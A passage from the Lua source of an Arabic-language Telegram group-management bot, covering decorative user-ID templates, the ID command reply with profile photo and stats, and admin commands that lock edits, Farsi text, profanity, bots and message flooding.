≈ 𝒔𝒕𝒂 √ #stast '
≈ 𝒊𝒅 √ #id '
≈ 𝒆𝒅𝒊𝒕 √ #edit '
]],
[[
𖣯 𝕀𝔻 🇮🇶⃤ #id
𖣯 𝕌𝕊𝔼ℝ 🇮🇶⃤ #username
𖣯 𝕄𝕊𝔾  🇮🇶⃤ #msgs
𖣯 𝕊𝕋𝔸𝕋𝔼 🇮🇶⃤ #stast
𖣯 𝔼𝔻𝕀𝕋 🇮🇶⃤ #edit
]],
[[
𝐘𝐨𝐮𝐫 𝐈𝐃 ☤🇮🇶- #id 
𝐔𝐬𝐞𝐫𝐍𝐚☤🇮🇶- #username 
𝐒𝐭𝐚𝐬𝐓 ☤🇮🇶- #stast 
𝐌𝐬𝐠𝐒☤🇮🇶 - #msgs
]],
[[
⿻┊Yor iD 𖠄 #id ٫
‌‎⿻┊UsEr 𖠄 #username ٫
‌‎⿻┊MsGs 𖠄 #msgs ٫
‌‎⿻┊StAtS 𖠄 #stast ٫
‌‎⿻┊‌‎EdiT 𖠄 #edit ٫
]],
[[
° 𝖘𝖙𝖆 : #stast ـ
° 𝖚𝖘𝖊𝖗𝖓𝖆𝖒𝖊 : #username ـ
°  𝖒𝖘𝖌𝖘 : #msgs ـ
° 𝖎𝖉 : #id ـ
]],
[[
• 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏
• 🖤 | 𝑺𝑻𝑨 : #stast 
• 🖤 | 𝑰𝑫 : #id ‌‌‏
• 🖤 | 𝑴𝑺𝑮 : #msgs
]],
[[
- 𝒊𝒅 ➺ #id 💗
- 𝒖𝒔𝒆𝒓 ➺  #username 💗
- 𝒎𝒔𝒈 ➺ #msgs 💗
- 𝒔𝒕𝒂𝒕𝒆 ➺ #stast 💗
- 𝒆𝒅I𝒕 ➺ #edit  💗
]],
[[
• ﮼ايديك ➺ #id  ٬
• ﮼يوزرك ➺ #username  ٬
• ﮼مسجاتك ➺ #msgs  ٬
•  ﮼رتبتك➺ #stast  ٬
• ﮼تعديلك ➺ #edit  ٬
]],
[[
- 𝄬 username . #username ➪
- 𝄬 stast . #stast ➪
- 𝄬 id . #id ➪
- 𝄬 gmas . #gmas ➪
- 𝄬 msgs . #msgs ➪
]],
[[
🇮🇶 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ . #username  .
🇮🇶 - 𝄬 ˢᵀᴬˢᵀ . #stast  .
🇮🇶 - 𝄬 ᴵᴰ . #id .
🇮🇶 - 𝄬 ᴳᴹᴬˢ . #gmas .
🇮🇶 - 𝄬 ᴹˢᴳˢ . #msgs  .
]],
[[
⌾ | 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 : #username .
⌾ | 𝗠𝗘𝗦𝗦𝗔𝗚𝗘𝗦 : #msgs .
⌾ | 𝗦𝗧𝗔𝗧𝗦 : #stast .
⌾ | 𝗜𝗗 : #id .
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➥• #username .
- ᴍѕɢѕ ➥• #msgs .
- ѕᴛᴀᴛѕ ➥• #stast .
- ʏᴏᴜʀ ɪᴅ ➥• #id  .
- ᴇᴅɪᴛ ᴍsɢ ➥• #edit .
- ᴅᴇᴛᴀɪʟs ➥• #auto . 
-  ɢᴀᴍᴇ ➥• #game .
]],
[[
⌾ | 𝒊𝒅  𓃠 #id .
⌾ | 𝒖𝒔𝒆𝒓 𓃠 #username .
⌾ | 𝒎𝒔𝒈𝒔 𓃠 #msgs .
⌾ | 𝒔𝒕𝒂𝒕𝒔 𓃠 #stast .
⌾ | 𝒆𝒅𝒊𝒕 𓃠 #edit .
]],
[[
- 𝘶𝘴𝘦𝘳 𖠰 #username .
- 𝘪𝘥 ㇱ #id .
- 𝘴𝘵𝘢  𖢞 #stast .
- 𝘮𝘴𝘨𝘴 ⁦𖠛 #msgs .
]],
[[
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
︙ - 𝚄𝚂𝙴𝚁 ⟿ #username 💞 .
︙ - 𝙼𝚂𝙶𝚂 ⟿  #msgs 💞 .
︙ - 𝙶𝙼𝙰𝚂 ⟿ #gmas 💞 .
︙- 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💞 .  
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
]],
[[
𓇡 . UsErNaMe . #username  .𖠲
𓇡 . StAsT . #stast 𖠲
𓇡 . Id . #id 𖠲
𓇡 . GaMeS . #game 𖠲
𓇡 . MsGs . #msgs 𖠲
]],
[[
- 𝐘𝐨𝐮𝐫 𝐈𝐃 🃏🇮🇶- #id 
- 𝐔𝐬𝐞𝐫𝐍𝐚🃏🇮🇶- #username 
- 𝐒𝐭𝐚𝐬𝐓 🃏🇮🇶- #stast 
- 𝐌𝐬𝐠𝐒🃏🇮🇶 - #msgs
]],
[[
.🛐 : 𝖴𝖲𝖤𝖱 #username 𓇡.
.🛐 : 𝖬𝖲𝖦 #msgs 𓇡.
.🛐 : 𝖲𝖳𝖠 #stast 𓇡.
.🛐 : 𝖨𝖣  #id 𓇡.
]],
[[
- ʏᴏᴜʀ ɪᴅ ➣ #id 
- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username 
- ѕᴛᴀᴛѕ ➣ #stast 
- ᴍѕɢѕ ➣ #msgs 
- ᴇᴅɪᴛ ᴍsɢ ➣  #edit
- ᴅᴇᴛᴀɪʟs ➣ #game
]],
[[
𖤓 ¦❀• USER ➭ ⁞ #username .
𖤓 ¦❀• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs  .
𖤓 ¦❀• STAT ➬ ⁞ #stast  .
𖤓 ¦❀• 𝙸𝙳  ➬ ⁞ #id  .
]],
[[
┄─━━◉━━─┄
𖣤 ᴜѕᴇʀɴᴀᴍᴇ 𓄹𓄼 #id 🇮🇶
𖦼 ʏᴏᴜʀ ɪᴅ 𓄹𓄼 #username  💛
𖥪 ᴍѕɢѕ 𓄹𓄼 #msgs ✉️
𖥧 ѕᴛᴀᴛѕ 𓄹𓄼 #stast 👩🏿‍🚒 
𖥣 ᴇᴅɪᴛ 𓄹𓄼 #game🙇🏿‍♀💕
✰ ᴄʜ ᴇʟɪɴ ➣ #edit
┄─━━◉━━─┄
]],
[[
金 - 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮 . #username ⸙ 
金 - 𝓼𝓽𝓪𝓼𝓽  . #stast ⸙ 
金 - 𝓲𝓭 . #id ⸙ 
金 - 𝓰𝓶𝓪𝓼 . #gmas ⸙ 
金 - 𝓶𝓼𝓰𝓼 . #msgs ⸙
]]}
local Text_Rand = List[math.random(#List)]
DevAIAN:set(WAAD.."AIAN:GpIds:Text"..msg.chat_id_,Text_Rand)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم تغير كليشة الايدي")  
end
--     Source WAAD     --
if SecondSudo(msg) then
if text and text:match("^تعيين الايدي العام$") or text and text:match("^تعين الايدي العام$") or text and text:match("^تعيين كليشة الايدي$") then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙رجائا اتبع التعليمات للتعيين \n⌯︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ', 1, 'md')
DevAIAN:set("WAAD:New:id:"..WAAD..msg.sender_user_id_,'WAAD')
return "WAAD"
end
if text and DevAIAN:get("WAAD:New:id:"..WAAD..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevAIAN:del("WAAD:New:id:"..WAAD..msg.sender_user_id_)
return false
end
DevAIAN:del("WAAD:New:id:"..WAAD..msg.sender_user_id_)
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم حفظ كليشة الايدي العامه', 1, 'md')
DevAIAN:set(WAAD.."AIAN:AllIds:Text",text)
return false
end
if text and text:match("^حذف الايدي العام$") or text and text:match("^مسح الايدي العام$") or text and text:match("^حذف كليشة الايدي$") then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف كليشة الايدي العامه")  
DevAIAN:del(WAAD.."AIAN:AllIds:Text")
end
end
--     Source WAAD     --
if text and text:match("^تعيين الايدي$") and ChCheck(msg) or text and text:match("^تعين الايدي$") and ChCheck(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙رجائا اتبع التعليمات للتعيين \n⌯︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ', 1, 'md')
DevAIAN:set("WAAD:New:id:"..WAAD..msg.chat_id_..msg.sender_user_id_,'WAAD')
return "WAAD"
end
if text and Manager(msg) and DevAIAN:get("WAAD:New:id:"..WAAD..msg.chat_id_..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevAIAN:del("WAAD:New:id:"..WAAD..msg.chat_id_..msg.sender_user_id_)
return false
end
DevAIAN:del("WAAD:New:id:"..WAAD..msg.chat_id_..msg.sender_user_id_)
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم حفظ الكليشه الجديده', 1, 'md')
DevAIAN:set(WAAD.."AIAN:GpIds:Text"..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and ChCheck(msg) or text and text:match("^مسح الايدي$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف كليشة الايدي")  
DevAIAN:del(WAAD.."AIAN:GpIds:Text"..msg.chat_id_)
end
end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0 then
return ""
else
if text and (text:match("^ايدي$") or text:match("^id$") or text:match("^Id$")) and ChCheck(msg) then
function WAAD(extra,SoOoFi,success)
if SoOoFi.username_ then username = '@'..SoOoFi.username_ else username = 'لا يوجد' end
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) ~= false then CustomTitle = GetCustomTitle(msg.sender_user_id_,msg.chat_id_) else CustomTitle = 'لا يوجد' end
local function getpro(extra, SoOoFi, success) 
local msgsday = DevAIAN:get(WAAD..'AIAN:UsersMsgs'..WAAD..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local edit_msg = DevAIAN:get(WAAD..'AIAN:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevAIAN:get(WAAD..'AIAN:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local user_nkt = tonumber(DevAIAN:get(WAAD..'AIAN:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(DevAIAN:get(WAAD..'AIAN:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local msguser = tonumber(DevAIAN:get(WAAD..'AIAN:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local Texting = {"مو صوره ظيم بالنبي ،🤤💞","مقتنع بصورتك !؟ 😹🖤","ملاك وناسيك بكروبنه ،🤤💞","وفالله ،🤤💞","كشخه برب ،😉🤍","لزكت بيها دغيرها عاد ،😒😕","صورتك مامرتاحلها ،🙄😶","حلغوم والله ،🥺💘","مو صوره غنبله براسها ٦٠ حظ ،😹🤍"}
local Description = Texting[math.random(#Texting)]
if SoOoFi.photos_[0] then
if not DevAIAN:get(WAAD..'AIAN:Lock:Id'..msg.chat_id_) then 
if not DevAIAN:get(WAAD..'AIAN:Lock:Id:Photo'..msg.chat_id_) then 
if DevAIAN:get(WAAD.."AIAN:AllIds:Text") then
newpicid = DevAIAN:get(WAAD.."AIAN:AllIds:Text")
newpicid = newpicid:gsub('#username',(username or 'لا يوجد'))
newpicid = newpicid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
newpicid = newpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
newpicid = newpicid:gsub('#photos',(SoOoFi.total_count_ or 'لا يوجد')) 
newpicid = newpicid:gsub('#game',(user_nkt or 'لا يوجد'))
newpicid = newpicid:gsub('#edit',(edit_msg or 'لا يوجد'))
newpicid = newpicid:gsub('#cont',(cont or 'لا يوجد'))
newpicid = newpicid:gsub('#msgs',(user_msgs or 'لا يوجد'))
newpicid = newpicid:gsub('#msgday',(msgsday or 'لا يوجد'))
newpicid = newpicid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
newpicid = newpicid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
newpicid = newpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
newpicid = newpicid:gsub('#Description',(Description or 'لا يوجد'))
else
newpicid = "⌯︙"..Description.."\n⌯︙معرفك ↫ ❨ "..username.." ❩\n⌯︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n⌯︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n⌯︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌯︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n⌯︙تفاعلك ↫ "..formsgs(msguser).."\n⌯︙نقاطك ↫ ❨ "..user_nkt.." ❩\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
end 
if not DevAIAN:get(WAAD.."AIAN:GpIds:Text"..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, SoOoFi.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = DevAIAN:get(WAAD.."AIAN:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(SoOoFi.total_count_ or '')) 
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#edit',(edit_msg or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'لا يوجد'))
local new_id = new_id:gsub('#msgday',(msgsday or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, SoOoFi.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
end
else
if DevAIAN:get(WAAD.."AIAN:AllIds:Text") then
newallid = DevAIAN:get(WAAD.."AIAN:AllIds:Text")
newallid = newallid:gsub('#username',(username or 'لا يوجد'))
newallid = newallid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
newallid = newallid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
newallid = newallid:gsub('#photos',(SoOoFi.total_count_ or 'لا يوجد')) 
newallid = newallid:gsub('#game',(user_nkt or 'لا يوجد'))
newallid = newallid:gsub('#edit',(edit_msg or 'لا يوجد'))
newallid = newallid:gsub('#cont',(cont or 'لا يوجد'))
newallid = newallid:gsub('#msgs',(user_msgs or 'لا يوجد'))
newallid = newallid:gsub('#msgday',(msgsday or 'لا يوجد'))
newallid = newallid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
newallid = newallid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
newallid = newallid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
newallid = newallid:gsub('#Description',(Description or 'لا يوجد'))
else
newallid = "⌯︙معرفك ↫ ❨ "..username.." ❩\n⌯︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n⌯︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n⌯︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌯︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n⌯︙تفاعلك ↫ "..formsgs(msguser).."\n⌯︙نقاطك ↫ ❨ "..user_nkt.." ❩"
end 
if not DevAIAN:get(WAAD.."AIAN:GpIds:Text"..msg.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, newallid, 1, 'html')
else
local new_id = DevAIAN:get(WAAD.."AIAN:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(SoOoFi.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#edit',(edit_msg or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'لا يوجد'))
local new_id = new_id:gsub('#msgday',(msgsday or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
Dev_AIAN(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')  
end
end
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙عذرا الايدي معطل ', 1, 'md')
end
else
if DevAIAN:get(WAAD.."AIAN:AllIds:Text") then
notpicid = DevAIAN:get(WAAD.."AIAN:AllIds:Text")
notpicid = notpicid:gsub('#username',(username or 'لا يوجد'))
notpicid = notpicid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
notpicid = notpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
notpicid = notpicid:gsub('#photos',(SoOoFi.total_count_ or 'لا يوجد')) 
notpicid = notpicid:gsub('#game',(user_nkt or 'لا يوجد'))
notpicid = notpicid:gsub('#edit',(edit_msg or 'لا يوجد'))
notpicid = notpicid:gsub('#cont',(cont or 'لا يوجد'))
notpicid = notpicid:gsub('#msgs',(user_msgs or 'لا يوجد'))
notpicid = notpicid:gsub('#msgday',(msgsday or 'لا يوجد'))
notpicid = notpicid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
notpicid = notpicid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
notpicid = notpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
notpicid = notpicid:gsub('#Description',(Description or 'لا يوجد'))
else
notpicid = "⌯︙لا استطيع عرض صورتك لانك قمت بحظر البوت او انك لاتمتلك صوره في بروفايلك\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙معرفك ↫ ❨ "..username.." ❩\n⌯︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n⌯︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n⌯︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌯︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n⌯︙تفاعلك ↫ "..formsgs(msguser).."\n⌯︙نقاطك ↫ ❨ "..user_nkt.." ❩\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
end 
if not DevAIAN:get(WAAD..'AIAN:Lock:Id'..msg.chat_id_) then
if not DevAIAN:get(WAAD..'AIAN:Lock:Id:Photo'..msg.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, notpicid, 1, 'html')
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙معرفك ↫ ❨ "..username.." ❩\n⌯︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n⌯︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n⌯︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌯︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n⌯︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌯︙تفاعلك ↫ "..formsgs(msguser).."\n⌯︙نقاطك ↫ ❨ "..user_nkt.." ❩", 1, 'md')
end
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙عذرا الايدي معطل', 1, 'md')
end end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
getUser(msg.sender_user_id_, WAAD)
end
end 
--     Source WAAD     --
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg) then
if text and text:match("^قفل (.*)$") then
local LockText = {string.match(text, "^(قفل) (.*)$")}
if LockText[2] == "التعديل" then
if not DevAIAN:get(WAAD..'AIAN:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل التعديل")  
DevAIAN:set(WAAD..'AIAN:Lock:EditMsgs'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙التعديل بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "التعديل الميديا" or LockText[2] == "تعديل الميديا" then
if not DevAIAN:get(WAAD..'AIAN:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل تعديل الميديا")  
DevAIAN:set(WAAD..'AIAN:Lock:EditMsgs'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تعديل الميديا بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفارسيه" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل الفارسيه")  
DevAIAN:set(WAAD..'AIAN:Lock:Farsi'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الفارسيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفشار" then
if DevAIAN:get(WAAD..'AIAN:Lock:Fshar'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل الفشار")  
DevAIAN:del(WAAD..'AIAN:Lock:Fshar'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الفشار بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الطائفيه" then
if DevAIAN:get(WAAD..'AIAN:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل الطائفيه")  
DevAIAN:del(WAAD..'AIAN:Lock:Taf'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الطائفيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الكفر" then
if DevAIAN:get(WAAD..'AIAN:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل الكفر")  
DevAIAN:del(WAAD..'AIAN:Lock:Kfr'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الكفر بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفارسيه بالطرد" then
if not DevAIAN:get(WAAD..'AIAN:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل الفارسيه بالطرد")  
DevAIAN:set(WAAD..'AIAN:Lock:FarsiBan'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الفارسيه بالطرد بالفعل مقفله ', 1, 'md')
end
end
if LockText[2] == "البوتات" or LockText[2] == "البوتات بالحذف" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل البوتات بالحذف")  
DevAIAN:set(WAAD.."AIAN:Lock:Bots"..msg.chat_id_,"del")  
end
if LockText[2] == "البوتات بالطرد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل البوتات بالطرد")  
DevAIAN:set(WAAD.."AIAN:Lock:Bots"..msg.chat_id_,"kick")  
end
if LockText[2] == "البوتات بالتقييد" or LockText[2] == "البوتات بالتقيد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل البوتات بالتقيد")  
DevAIAN:set(WAAD.."AIAN:Lock:Bots"..msg.chat_id_,"ked")  
end
if LockText[2] == "التكرار" or LockText[2] == "التكرار بالحذف" then 
DevAIAN:hset(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل التكرار بالحذف")  
end
if LockText[2] == "التكرار بالطرد" then 
DevAIAN:hset(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل التكرار بالطرد")  
end
if LockText[2] == "التكرار بالتقيد" or LockText[2] == "التكرار بالتقييد" then 
DevAIAN:hset(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل التكرار بالتقيد")  
end
if LockText[2] == "التكرار بالكتم" then 
DevAIAN:hset(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل التكرار بالكتم")  
end
if BasicConstructor(msg) then
if LockText[2] == "التثبيت" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Pin'..msg.chat_id_) then
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  DevAIAN:set(WAAD.."AIAN:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل التثبيت")  
DevAIAN:set(WAAD..'AIAN:Lock:Pin'..msg.chat_id_,true)
DevAIAN:sadd(WAAD.."AIAN:Lock:Pinpin",msg.chat_id_) 
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙التثبيت بالفعل مقفل في المجموعه', 1, 'md')
end end end
end
end
end
--     Source WAAD     --
if Admin(msg) then
if text and (text:match("^ضع تكرار (%d+)$") or text:match("^وضع تكرار (%d+)$")) then   
local TextSpam = text:match("ضع تكرار (%d+)$") or text:match("وضع تكرار (%d+)$")
if tonumber(TextSpam) < 2 then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙قم بتحديد عدد اكبر من 2 للتكرار', 1, 'md')
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم وضع عدد التكرار ↫ '..TextSpam, 1, 'md')
DevAIAN:hset(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
end
end
if text and (text:match("^ضع زمن التكرار (%d+)$") or text:match("^وضع زمن التكرار (%d+)$")) then  
local TextSpam = text:match("ضع زمن التكرار (%d+)$") or text:match("وضع زمن التكرار (%d+)$")
DevAIAN:hset(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم وضع زمن التكرار ↫ '..TextSpam, 1, 'md')
end
--     Source WAAD     --
if Manager(msg) then
if text and text == 'تفعيل الايدي بالصوره' and ChCheck(msg) then
if not DevAIAN:get(WAAD..'AIAN:Lock:Id:Photo'..msg.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الايدي بالصوره بالتاكيد مفعل', 1, 'md')
else
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل الايدي بـ الصوره")
